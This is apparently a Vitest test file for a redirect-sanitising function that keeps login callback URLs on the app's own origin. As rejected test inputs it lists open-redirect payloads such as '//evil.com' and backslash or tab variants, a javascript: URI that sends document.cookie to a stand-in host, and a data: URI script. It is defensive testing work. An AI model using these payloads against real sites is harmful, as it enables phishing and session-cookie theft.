import { describe, expect, it } from 'vitest';

import { DEFAULT_REDIRECT, safeRedirectPath } from '@/lib/safe-redirect';

/**
 * These assertions are written against the requirement — "a callbackUrl must never send a user to
 * another origin" — rather than against the implementation. Each hostile case therefore also
 * asserts what `new URL()` would have done with the raw value, so the test states the actual
 * danger instead of merely restating the guard.
 */
describe('safeRedirectPath', () => {
	const ORIGIN = 'https://sharecircle.app/login';

	describe('rejects anything that resolves off-origin', () => {
		const offOrigin = ['//evil.com', '//evil.com/path', '/\\evil.com', '///evil.com', '/\u0009/evil.com'];

		it.each(offOrigin)('rejects %j', raw => {
			// Establish that the input really is dangerous before asserting we block it. Stripping the
			// control characters first models what a browser does to a URL before parsing, so this is
			// the value the navigation would actually have used.
			// eslint-disable-next-line no-control-regex
			const resolved = new URL(raw.replace(/[\u0000-\u001F\u007F]/g, ''), ORIGIN);
			expect(resolved.origin).not.toBe('https://sharecircle.app');

			expect(safeRedirectPath(raw)).toBe(DEFAULT_REDIRECT);
		});

		it('rejects the value the old startsWith check let through', () => {
			const raw = '//evil.com';
			expect(raw.startsWith('/')).toBe(true); // the old guard passed
			expect(safeRedirectPath(raw)).toBe(DEFAULT_REDIRECT); // the new one does not
		});
	});

	describe('rejects non-path schemes', () => {
		it.each([
			'javascript:fetch("//evil/"+document.cookie)',
			'https://evil.com',
			'http://evil.com',
			'data:text/html,<script>alert(1)</script>',
			'mailto:a@b.c',
		])('rejects %j', raw => {
			expect(safeRedirectPath(raw)).toBe(DEFAULT_REDIRECT);
		});
	});

	describe('allows genuine same-origin paths', () => {
		it.each([
			'/home',
			'/circles',
			'/join?code=ABC123',
			'/items/abc-123',
			'/messages?thread=1&tab=all',
			'/complete-profile',
		])('allows %j', raw => {
			expect(new URL(raw, ORIGIN).origin).toBe('https://sharecircle.app');
			expect(safeRedirectPath(raw)).toBe(raw);
		});

		it('preserves the query string, so ?code= survives the login round trip', () => {
			expect(safeRedirectPath('/join?code=XYZ')).toBe('/join?code=XYZ');
		});
	});

	describe('falls back rather than throwing', () => {
		it.each([null, undefined, ''])('returns the default for %j', raw => {
			expect(safeRedirectPath(raw)).toBe(DEFAULT_REDIRECT);
		});

		it('honours an explicit fallback', () => {
			expect(safeRedirectPath('//evil.com', '/login')).toBe('/login');
		});
	});
});
